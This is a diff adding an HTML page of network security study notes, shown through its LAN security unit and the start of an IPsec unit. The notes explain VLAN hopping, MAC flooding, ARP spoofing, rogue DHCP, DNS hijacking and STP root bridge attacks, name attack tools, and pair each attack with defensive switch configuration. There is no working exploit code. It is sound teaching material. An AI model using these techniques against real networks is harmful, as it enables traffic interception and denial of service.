@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Network Security — Complete Study Notes</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;600;800&family=Fraunces:ital,wght@0,300;0,700;1,300&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg:        #0a0d14;
+    --surface:   #111520;
+    --card:      #161c2d;
+    --border:    #1e2840;
+    --accent1:   #00d4ff;
+    --accent2:   #ff4d6d;
+    --accent3:   #39ff14;
+    --accent4:   #ffa500;
+    --muted:     #4a5568;
+    --text:      #c9d1e0;
+    --heading:   #eef2ff;
+    --code-bg:   #0d1117;
+    --tag-bg:    rgba(0,212,255,0.1);
+    --transition-speed: 0.35s;
+  }
+
+  /* ── LIGHT MODE ── */
+  html.light {
+    --bg:        #f4f6fb;
+    --surface:   #ffffff;
+    --card:      #ffffff;
+    --border:    #dce3f0;
+    --accent1:   #0077cc;
+    --accent2:   #d63050;
+    --accent3:   #1a8a00;
+    --accent4:   #c47a00;
+    --muted:     #8896b0;
+    --text:      #2d3748;
+    --heading:   #0f1729;
+    --code-bg:   #eef1f8;
+    --tag-bg:    rgba(0,119,204,0.08);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Fraunces', Georgia, serif;
+    font-size: 16px;
+    line-height: 1.75;
+    min-height: 100vh;
+    transition: background var(--transition-speed) ease, color var(--transition-speed) ease;
+  }
+
+  /* Smooth transition for themed elements */
+  header, .toc-box, .topic, .topic-header, .topic-body,
+  .cmp-table th, .cmp-table td, pre, code, .callout, footer {
+    transition: background var(--transition-speed) ease,
+                border-color var(--transition-speed) ease,
+                color var(--transition-speed) ease;
+  }
+
+  /* ── noise overlay ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none; z-index: 0;
+  }
+
+  /* ── HEADER ── */
+  header {
+    position: relative;
+    padding: 5rem 2rem 4rem;
+    text-align: center;
+    overflow: hidden;
+    border-bottom: 1px solid var(--border);
+  }
+  header::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,212,255,0.12) 0%, transparent 70%),
+                radial-gradient(ellipse 50% 40% at 80% 100%, rgba(255,77,109,0.08) 0%, transparent 60%);
+    pointer-events: none;
+  }
+  .site-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.25em;
+    text-transform: uppercase;
+    color: var(--accent1);
+    margin-bottom: 1.2rem;
+    opacity: 0.9;
+  }
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(2.2rem, 6vw, 4rem);
+    font-weight: 800;
+    color: var(--heading);
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+  }
+  h1 span { color: var(--accent1); }
+  .subtitle {
+    margin-top: 1rem;
+    font-size: 1rem;
+    color: var(--muted);
+    font-style: italic;
+    font-family: 'Fraunces', serif;
+  }
+  .badges {
+    display: flex; flex-wrap: wrap; gap: 0.5rem;
+    justify-content: center; margin-top: 1.8rem;
+  }
+  .badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    padding: 0.3rem 0.8rem;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+  .badge-blue   { background: rgba(0,212,255,0.15); color: var(--accent1); border: 1px solid rgba(0,212,255,0.3); }
+  .badge-red    { background: rgba(255,77,109,0.15); color: var(--accent2); border: 1px solid rgba(255,77,109,0.3); }
+  .badge-green  { background: rgba(57,255,20,0.12); color: var(--accent3); border: 1px solid rgba(57,255,20,0.25); }
+  .badge-orange { background: rgba(255,165,0,0.15); color: var(--accent4); border: 1px solid rgba(255,165,0,0.3); }
+
+  /* ── TOC ── */
+  nav.toc {
+    max-width: 900px; margin: 3rem auto;
+    padding: 0 1.5rem;
+  }
+  .toc-box {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent1);
+    padding: 1.8rem 2rem;
+    border-radius: 4px;
+  }
+  .toc-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 0.75rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent1);
+    margin-bottom: 1.2rem;
+  }
+  .toc-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 0.4rem 1.5rem;
+  }
+  .toc-grid a {
+    color: var(--text);
+    text-decoration: none;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    display: flex; align-items: center; gap: 0.5rem;
+    padding: 0.25rem 0;
+    border-bottom: 1px solid transparent;
+    transition: color 0.2s, border-color 0.2s;
+  }
+  .toc-grid a::before { content: '›'; color: var(--accent1); font-size: 1rem; }
+  .toc-grid a:hover { color: var(--accent1); border-color: var(--border); }
+
+  /* ── MAIN ── */
+  main { max-width: 900px; margin: 0 auto; padding: 0 1.5rem 6rem; }
+
+  /* ── UNIT HEADER ── */
+  .unit {
+    margin-top: 4rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid var(--border);
+  }
+  .unit-number {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent2);
+    margin-bottom: 0.4rem;
+  }
+  .unit > h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(1.5rem, 4vw, 2.2rem);
+    font-weight: 800;
+    color: var(--heading);
+    letter-spacing: -0.01em;
+    line-height: 1.2;
+  }
+  .unit-desc {
+    font-style: italic;
+    color: var(--muted);
+    margin-top: 0.5rem;
+    font-size: 0.9rem;
+  }
+
+  /* ── TOPIC CARD ── */
+  .topic {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin-top: 2rem;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .topic:hover { border-color: var(--accent1); }
+
+  .topic-header {
+    display: flex; align-items: center; gap: 1rem;
+    padding: 1.1rem 1.5rem;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    cursor: pointer;
+    user-select: none;
+  }
+  .topic-icon {
+    width: 32px; height: 32px;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--tag-bg);
+    border: 1px solid rgba(0,212,255,0.2);
+    border-radius: 4px;
+    font-size: 1rem;
+    flex-shrink: 0;
+  }
+  .topic-header h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 1rem;
+    font-weight: 600;
+    color: var(--heading);
+    flex: 1;
+  }
+  .chevron {
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    transition: transform 0.25s;
+  }
+  .topic.open .chevron { transform: rotate(90deg); }
+  .topic-body {
+    display: none;
+    padding: 1.4rem 1.6rem 1.6rem;
+  }
+  .topic.open .topic-body { display: block; }
+
+  /* ── TYPOGRAPHY inside topics ── */
+  .topic-body h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--accent1);
+    margin: 1.4rem 0 0.6rem;
+  }
+  .topic-body h4:first-child { margin-top: 0; }
+
+  .topic-body p { color: var(--text); margin-bottom: 0.8rem; font-size: 0.95rem; }
+
+  .topic-body ul, .topic-body ol {
+    padding-left: 1.4rem;
+    margin-bottom: 0.8rem;
+  }
+  .topic-body li { font-size: 0.92rem; color: var(--text); margin-bottom: 0.3rem; }
+  .topic-body li::marker { color: var(--accent1); }
+
+  /* code */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82rem;
+    background: var(--code-bg);
+    color: var(--accent3);
+    padding: 0.1em 0.4em;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent3);
+    border-radius: 4px;
+    padding: 1rem 1.2rem;
+    overflow-x: auto;
+    margin: 0.8rem 0;
+  }
+  pre code { background: none; border: none; padding: 0; color: var(--accent3); font-size: 0.82rem; line-height: 1.7; }
+
+  /* callout boxes */
+  .callout {
+    border-radius: 4px;
+    padding: 0.9rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.88rem;
+    display: flex; gap: 0.7rem; align-items: flex-start;
+  }
+  .callout-icon { flex-shrink: 0; font-size: 1rem; margin-top: 0.05rem; }
+  .callout.warn  { background: rgba(255,165,0,0.1); border-left: 3px solid var(--accent4); color: #f0c080; }
+  .callout.danger{ background: rgba(255,77,109,0.1); border-left: 3px solid var(--accent2); color: #ffb0bd; }
+  .callout.info  { background: rgba(0,212,255,0.08); border-left: 3px solid var(--accent1); color: #90e0ef; }
+  .callout.tip   { background: rgba(57,255,20,0.08); border-left: 3px solid var(--accent3); color: #aaff88; }
+
+  /* comparison table */
+  .cmp-table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.85rem; }
+  .cmp-table th {
+    background: var(--surface);
+    color: var(--accent1);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    padding: 0.6rem 0.8rem;
+    border: 1px solid var(--border);
+    text-align: left;
+  }
+  .cmp-table td {
+    padding: 0.55rem 0.8rem;
+    border: 1px solid var(--border);
+    vertical-align: top;
+    color: var(--text);
+  }
+  .cmp-table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+
+  /* tag pill */
+  .tag {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    padding: 0.15rem 0.55rem;
+    border-radius: 2px;
+    margin: 0.1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  .tag-red    { background: rgba(255,77,109,0.15); color: var(--accent2); border:1px solid rgba(255,77,109,0.3); }
+  .tag-blue   { background: rgba(0,212,255,0.12);  color: var(--accent1); border:1px solid rgba(0,212,255,0.25); }
+  .tag-green  { background: rgba(57,255,20,0.1);   color: var(--accent3); border:1px solid rgba(57,255,20,0.2); }
+  .tag-orange { background: rgba(255,165,0,0.12);  color: var(--accent4); border:1px solid rgba(255,165,0,0.25); }
+
+  /* ── FOOTER ── */
+  footer {
+    text-align: center;
+    padding: 3rem 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    letter-spacing: 0.08em;
+  }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent1); }
+
+  /* ── THEME TOGGLE ── */
+  #theme-toggle {
+    position: fixed;
+    top: 1.2rem;
+    right: 1.4rem;
+    z-index: 999;
+    display: flex;
+    align-items: center;
+    gap: 0.55rem;
+    padding: 0.45rem 1rem 0.45rem 0.6rem;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--text);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+    transition: background var(--transition-speed) ease,
+                border-color var(--transition-speed) ease,
+                color var(--transition-speed) ease,
+                box-shadow 0.2s ease,
+                transform 0.15s ease;
+    user-select: none;
+  }
+  #theme-toggle:hover {
+    border-color: var(--accent1);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.35), 0 0 0 1px var(--accent1);
+    transform: translateY(-1px);
+  }
+  #theme-toggle:active { transform: translateY(0); }
+
+  /* track */
+  .toggle-track {
+    position: relative;
+    width: 36px; height: 20px;
+    background: var(--border);
+    border-radius: 999px;
+    flex-shrink: 0;
+    transition: background var(--transition-speed) ease;
+  }
+  html.light .toggle-track { background: var(--accent1); }
+
+  /* thumb */
+  .toggle-thumb {
+    position: absolute;
+    top: 3px; left: 3px;
+    width: 14px; height: 14px;
+    background: var(--heading);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 9px;
+    transition: transform var(--transition-speed) cubic-bezier(.34,1.56,.64,1),
+                background var(--transition-speed) ease;
+  }
+  html.light .toggle-thumb { transform: translateX(16px); }
+
+  .toggle-label { color: var(--text); transition: color var(--transition-speed) ease; }
+
+  /* light mode — noise overlay lighter */
+  html.light body::before { opacity: 0.015; }
+</style>
+</head>
+<body>
+
+<!-- ── THEME TOGGLE BUTTON ── -->
+<button id="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark mode">
+  <div class="toggle-track">
+    <div class="toggle-thumb" id="toggle-icon">🌙</div>
+  </div>
+  <span class="toggle-label" id="toggle-label">Dark</span>
+</button>
+
+<header>
+  <p class="site-label">// Study Guide · Network Security · Full Syllabus</p>
+  <h1>Network <span>Security</span><br>Complete Notes</h1>
+  <p class="subtitle">Units 1–5 · LAN Security → Wireless → Packet Analysis</p>
+  <div class="badges">
+    <span class="badge badge-blue">Unit 1 · LAN Security</span>
+    <span class="badge badge-orange">Unit 2 · IP Security</span>
+    <span class="badge badge-green">Unit 3 · Transport & Email</span>
+    <span class="badge badge-red">Unit 4 · Pen Testing</span>
+    <span class="badge badge-blue">Unit 5 · Wireless & Sniffing</span>
+  </div>
+</header>
+
+<nav class="toc">
+  <div class="toc-box">
+    <p class="toc-title">// Table of Contents</p>
+    <div class="toc-grid">
+      <a href="#u1">Unit 1: LAN Security</a>
+      <a href="#u2">Unit 2: IP Security</a>
+      <a href="#u3">Unit 3: Transport & Email</a>
+      <a href="#u4">Unit 4: Pen Testing</a>
+      <a href="#u5">Unit 5: Wireless & Sniffing</a>
+    </div>
+  </div>
+</nav>
+
+<main>
+
+<!-- ═══════════════════════════════════════════════
+     UNIT 1 — LAN SECURITY
+═══════════════════════════════════════════════ -->
+<section class="unit" id="u1">
+  <p class="unit-number">// Unit 01</p>
+  <h2>LAN Security</h2>
+  <p class="unit-desc">Layer 2 attacks, VLAN threats, ARP/DHCP exploits, Spanning Tree weaknesses, and monitoring tools.</p>
+
+  <!-- VLAN Hopping -->
+  <div class="topic" id="vlan-hopping">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🔀</div>
+      <h3>VLAN Hopping &amp; Tag Stack (Double Tagging) Attack</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>What is VLAN Hopping?</h4>
+      <p>VLAN hopping is a Layer 2 attack that allows an attacker on one VLAN to send/receive frames to/from another VLAN that would normally be inaccessible — bypassing inter-VLAN routing controls.</p>
+
+      <h4>Method 1 — Switch Spoofing</h4>
+      <p>The attacker configures their NIC to negotiate 802.1Q trunking with a switch (using DTP — Dynamic Trunking Protocol). Once the switch thinks it's talking to another switch, it establishes a trunk link, sending frames for ALL VLANs to the attacker.</p>
+      <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Root Cause:</strong> DTP is enabled by default on Cisco switches. Attackers exploit auto-trunk negotiation.</div></div>
+      <p><strong>Defence:</strong> Disable DTP — set all access ports to <code>switchport mode access</code> and explicitly configure trunk ports.</p>
+
+      <h4>Method 2 — Double Tagging (Tag Stack Attack)</h4>
+      <p>The attacker crafts a frame with <strong>two 802.1Q VLAN tags</strong>:</p>
+      <ul>
+        <li><strong>Outer tag</strong> = attacker's native VLAN (e.g. VLAN 1)</li>
+        <li><strong>Inner tag</strong> = target VLAN (e.g. VLAN 20)</li>
+      </ul>
+      <p>The first switch strips the outer tag (matches native VLAN) and forwards the frame with the inner tag intact to the next switch, which delivers it to VLAN 20. This is a <em>one-way</em> attack — responses cannot return.</p>
+      <pre><code>Attacker Frame:
+[Outer 802.1Q: VLAN 1][Inner 802.1Q: VLAN 20][Payload]
+         ↓ Switch 1 strips outer tag
+[Inner 802.1Q: VLAN 20][Payload]
+         ↓ Switch 2 sends to VLAN 20 ✓</code></pre>
+      <div class="callout tip"><span class="callout-icon">✅</span><div><strong>Defence:</strong> Change the native VLAN from default (VLAN 1) to an unused VLAN; tag the native VLAN explicitly on all trunks.</div></div>
+
+      <h4>Key Exam Points</h4>
+      <ul>
+        <li>VLAN hopping bypasses <em>logical</em> segmentation — does NOT break physical separation</li>
+        <li>Double tagging only works toward the victim (uni-directional)</li>
+        <li>Countermeasures: disable DTP, change native VLAN, use private VLANs</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Broadcast Floods -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📡</div>
+      <h3>Broadcast Floods &amp; Layer 2 DoS</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Broadcast / MAC Flooding</h4>
+      <p>A switch maintains a <strong>CAM table</strong> (Content Addressable Memory) mapping MAC → port. An attacker sends millions of frames with random source MACs, exhausting the CAM table. When full, the switch <em>fails open</em> — it floods ALL frames out ALL ports (behaves like a hub), enabling eavesdropping.</p>
+      <div class="callout danger"><span class="callout-icon">🔴</span><div>Tool used: <code>macof</code> (part of dsniff suite) can generate thousands of random MAC entries per second.</div></div>
+      <h4>Broadcast Storm</h4>
+      <p>A loop in the network causes broadcast frames to circulate endlessly, consuming all bandwidth. Prevented by Spanning Tree Protocol (STP). An attacker can induce storms by creating loops or by sending crafted BPDU frames to disable STP.</p>
+      <h4>Countermeasures</h4>
+      <ul>
+        <li><strong>Port Security:</strong> Limit the number of MAC addresses per port (e.g. max 2). Violation actions: <em>restrict, protect, shutdown</em></li>
+        <li><strong>Storm Control:</strong> Rate-limit broadcast/multicast/unicast traffic per port (threshold in pps or %)</li>
+        <li><strong>BPDU Guard:</strong> Shutdown ports that receive unexpected BPDU frames</li>
+      </ul>
+      <pre><code>! Port security config (Cisco)
+interface Fa0/1
+ switchport mode access
+ switchport port-security maximum 2
+ switchport port-security violation shutdown
+ switchport port-security</code></pre>
+    </div>
+  </div>
+
+  <!-- ARP Spoofing -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🎭</div>
+      <h3>ARP Spoofing / ARP Poisoning</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>How ARP Works</h4>
+      <p>ARP (Address Resolution Protocol, RFC 826) maps IP addresses to MAC addresses. When host A wants to reach host B, it broadcasts <em>"Who has IP x.x.x.x? Tell A."</em> B replies with its MAC.</p>
+      <div class="callout warn"><span class="callout-icon">⚠</span><div>ARP is <strong>stateless and unauthenticated</strong>. Any host can send a gratuitous ARP reply — no request needed.</div></div>
+      <h4>The Attack</h4>
+      <p>The attacker sends crafted ARP replies to both the victim and the gateway, poisoning both their ARP caches:</p>
+      <pre><code>Attacker → Victim: "Gateway's MAC = AA:BB:CC:DD:EE:FF (attacker's MAC)"
+Attacker → Gateway: "Victim's MAC = AA:BB:CC:DD:EE:FF (attacker's MAC)"
+Result: All traffic flows through attacker (MITM)</code></pre>
+      <h4>Consequences</h4>
+      <ul>
+        <li>Man-in-the-Middle (MITM) — intercept/modify traffic</li>
+        <li>Session hijacking, credential theft</li>
+        <li>Denial of Service (drop intercepted packets)</li>
+        <li>SSL stripping when combined with sslstrip</li>
+      </ul>
+      <h4>Tools</h4>
+      <p><span class="tag tag-red">Ettercap</span> <span class="tag tag-red">arpspoof (dsniff)</span> <span class="tag tag-red">Cain &amp; Abel</span> <span class="tag tag-red">Bettercap</span></p>
+      <h4>Defences</h4>
+      <ul>
+        <li><strong>Dynamic ARP Inspection (DAI):</strong> Validates ARP packets against a DHCP snooping binding table; drops invalid ARP replies</li>
+        <li><strong>Static ARP entries:</strong> For critical hosts (gateways)</li>
+        <li><strong>802.1X:</strong> Port-based authentication</li>
+        <li><strong>Encryption (TLS/SSH):</strong> MITM loses value if traffic is encrypted end-to-end</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- DHCP Attacks -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📋</div>
+      <h3>DHCP Attacks, Starvation &amp; Rogue DHCP</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>DHCP Starvation (DoS)</h4>
+      <p>The attacker floods the DHCP server with DISCOVER messages using random/spoofed MAC addresses, exhausting the IP address pool. Legitimate clients cannot obtain IP addresses.</p>
+      <p><strong>Tool:</strong> <code>Gobbler</code>, <code>yersinia</code></p>
+      <h4>Rogue DHCP Server (DHCP Hijacking)</h4>
+      <p>After starving the legitimate server, the attacker stands up their own DHCP server. Clients receive:</p>
+      <ul>
+        <li>Attacker's machine as the <strong>default gateway</strong> → MITM all traffic</li>
+        <li>Attacker's machine as the <strong>DNS server</strong> → DNS hijacking</li>
+      </ul>
+      <h4>DHCP Snooping (Defence)</h4>
+      <p>Switch feature that acts as a firewall between trusted (uplink) and untrusted (access) ports:</p>
+      <ul>
+        <li><strong>Trusted ports:</strong> only connected to real DHCP servers or uplinks</li>
+        <li><strong>Untrusted ports:</strong> client-facing — DHCP replies from these ports are dropped</li>
+        <li>Builds a binding table: MAC ↔ IP ↔ VLAN ↔ Port (used by DAI and IP Source Guard)</li>
+      </ul>
+      <pre><code>! Enable DHCP Snooping (Cisco)
+ip dhcp snooping
+ip dhcp snooping vlan 10
+interface Gi0/1
+ ip dhcp snooping trust     ! uplink or real server port</code></pre>
+    </div>
+  </div>
+
+  <!-- DNS Hijacking -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🌐</div>
+      <h3>DNS Hijacking</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>DNS Overview</h4>
+      <p>DNS translates domain names (google.com) to IP addresses. It operates over UDP/TCP port 53 and is <em>unauthenticated by default</em>.</p>
+      <h4>DNS Cache Poisoning (Kaminsky Attack)</h4>
+      <p>An attacker injects forged DNS responses into a resolver's cache, redirecting users to malicious IPs without compromising the DNS server itself. The attacker races to answer a DNS query with a forged response before the legitimate server responds.</p>
+      <h4>DNS Hijacking via Rogue DHCP</h4>
+      <p>When DHCP assigns the attacker as the DNS server, every domain name resolution goes through the attacker who can respond with any IP — redirecting traffic to phishing sites.</p>
+      <h4>Defences</h4>
+      <ul>
+        <li><strong>DNSSEC:</strong> Digitally signs DNS records — validates authenticity and integrity</li>
+        <li><strong>DNS over HTTPS (DoH) / DNS over TLS (DoT):</strong> Encrypts DNS queries</li>
+        <li><strong>Randomise source port + query ID</strong> to make cache poisoning harder</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Spanning Tree -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🌳</div>
+      <h3>Spanning Tree Protocol (STP) Attacks</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>STP Overview</h4>
+      <p>IEEE 802.1D STP prevents Layer 2 loops by electing a <strong>Root Bridge</strong> (lowest Bridge ID = priority + MAC), then blocking redundant paths. Switches exchange <strong>BPDU (Bridge Protocol Data Units)</strong> to build the spanning tree.</p>
+      <h4>Root Bridge Hijacking</h4>
+      <p>An attacker connects a device and sends BPDUs with a very low priority (e.g. 0), claiming to be the root bridge. Legitimate switches re-elect the topology around the attacker — all traffic now flows through the attacker's device.</p>
+      <pre><code>Attacker sends BPDU with Priority = 0 (lower than real root)
+→ Switches accept attacker as new Root Bridge
+→ STP reconverges, all traffic re-routes through attacker</code></pre>
+      <h4>STP DoS (Topology Change Attack)</h4>
+      <p>Continuously sending Topology Change Notifications (TCNs) forces switches to flush their MAC tables constantly, flooding all frames and degrading performance.</p>
+      <h4>Defences</h4>
+      <ul>
+        <li><strong>BPDU Guard:</strong> Immediately shuts down any access port that receives a BPDU (access ports should never receive BPDUs)</li>
+        <li><strong>Root Guard:</strong> Prevents a port from becoming a root port; if a superior BPDU arrives, the port is placed in root-inconsistent state</li>
+        <li><strong>BPDU Filter:</strong> Suppresses sending/receiving BPDUs on a port (use carefully — can re-introduce loops)</li>
+        <li><strong>PortFast:</strong> Instantly transitions access ports to forwarding state (skips STP), combined with BPDU Guard</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Control Plane Policing -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">🛡️</div>
+      <h3>Control Plane Policing (CoPP) &amp; Link Layer Security</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>Control Plane Policing (CoPP)</h4>
+      <p>Routers/switches have three planes: <strong>Data plane</strong> (forwarding), <strong>Control plane</strong> (routing protocols, STP, ARP — handled by CPU), and <strong>Management plane</strong> (SSH, SNMP). CoPP uses Modular QoS CLI (MQC) to rate-limit traffic destined for the control plane CPU, protecting against CPU-exhaustion attacks.</p>
+      <pre><code>class-map match-any COPP-ROUTING
+ match protocol ospf
+ match protocol bgp
+policy-map COPP-POLICY
+ class COPP-ROUTING
+  police rate 64000 bps conform-action transmit exceed-action drop
+control-plane
+ service-policy input COPP-POLICY</code></pre>
+      <h4>Link Layer Security — 802.1AE (MACsec)</h4>
+      <p><strong>IEEE 802.1AE MACsec</strong> provides point-to-point Layer 2 encryption between switches or between a switch and a host. It encrypts Ethernet frames hop-by-hop, preventing eavesdropping even if someone taps the cable.</p>
+      <ul>
+        <li>Uses AES-GCM-128 or AES-GCM-256 encryption</li>
+        <li>Provides integrity, confidentiality, and replay protection at Layer 2</li>
+        <li>Key management via 802.1X and MKA (MACsec Key Agreement protocol)</li>
+      </ul>
+      <h4>Port Security</h4>
+      <p>Port security limits which MAC addresses can communicate through a switch port, preventing MAC flooding and unauthorised device connection.</p>
+      <table class="cmp-table">
+        <tr><th>Violation Mode</th><th>Drops Frame</th><th>Sends Syslog</th><th>Shuts Port</th></tr>
+        <tr><td>Protect</td><td>Yes</td><td>No</td><td>No</td></tr>
+        <tr><td>Restrict</td><td>Yes</td><td>Yes</td><td>No</td></tr>
+        <tr><td>Shutdown (default)</td><td>Yes</td><td>Yes</td><td>Yes (err-disabled)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- NetFlow & RMON -->
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📊</div>
+      <h3>NetFlow &amp; RMON 2</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>NetFlow</h4>
+      <p>Cisco NetFlow collects IP traffic flow data from routers/switches and exports it to a <strong>NetFlow collector</strong>. A <em>flow</em> is defined by 5-tuple: Source IP, Destination IP, Source Port, Dest Port, Protocol.</p>
+      <ul>
+        <li><strong>Version 5:</strong> Fixed-format, IPv4 only (most common)</li>
+        <li><strong>Version 9:</strong> Template-based, flexible, supports IPv6</li>
+        <li><strong>IPFIX (v10):</strong> IETF standard based on NetFlow v9</li>
+      </ul>
+      <p><strong>Security Use:</strong> Anomaly detection (sudden traffic spikes, port scans, DDoS traffic patterns), forensic investigation, capacity planning.</p>
+      <h4>RMON 2 (Remote Monitoring v2)</h4>
+      <p>RMON 2 extends RMON 1 (which only monitored up to Layer 2) to <strong>Layer 3 and above</strong> (IP, application layer). RMON agents in network devices collect statistics that an SNMP-based management station can retrieve.</p>
+      <ul>
+        <li><strong>RMON 1:</strong> Ethernet statistics, traffic history, alarms, packet captures (up to Layer 2)</li>
+        <li><strong>RMON 2:</strong> Network-layer (IP) and application-layer traffic analysis</li>
+        <li>Useful for detecting unusual protocol usage or application traffic anomalies</li>
+      </ul>
+      <table class="cmp-table">
+        <tr><th>Feature</th><th>NetFlow</th><th>RMON 2</th></tr>
+        <tr><td>Layer</td><td>L3–L7 (flows)</td><td>L2–L7 (stats)</td></tr>
+        <tr><td>Protocol</td><td>UDP export to collector</td><td>SNMP</td></tr>
+        <tr><td>Granularity</td><td>Per-flow (5-tuple)</td><td>Per-interface stats</td></tr>
+        <tr><td>Use case</td><td>Traffic accounting, anomaly detection</td><td>Network baseline, trend analysis</td></tr>
+      </table>
+    </div>
+  </div>
+
+</section>
+
+<!-- ═══════════════════════════════════════════════
+     UNIT 2 — IP SECURITY
+═══════════════════════════════════════════════ -->
+<section class="unit" id="u2">
+  <p class="unit-number">// Unit 02</p>
+  <h2>IP Security (IPsec)</h2>
+  <p class="unit-desc">IPsec architecture, AH, ESP, SA combinations, IKE, transport/tunnel modes, and VPNs.</p>
+
+  <div class="topic">
+    <div class="topic-header" onclick="toggle(this)">
+      <div class="topic-icon">📐</div>
+      <h3>IPsec Overview &amp; Security Policy</h3>
+      <span class="chevron">›</span>
+    </div>
+    <div class="topic-body">
+      <h4>What is IPsec?</h4>
+      <p>IPsec (Internet Protocol Security) is a suite of protocols standardised by IETF (RFC 4301–4309) that provides security services at the <strong>IP layer (Layer 3)</strong>. It is transparent to applications — no application changes required.</p>
+      <h4>Services Provided</h4>
+      <ul>
+        <li><strong>Authentication:</strong> Verifies the identity of the communicating parties</li>
+        <li><strong>Integrity:</strong> Ensures packets are not tampered with in transit (HMAC)</li>
+        <li><strong>Confidentiality:</strong> Encrypts packet payloads (ESP)</li>
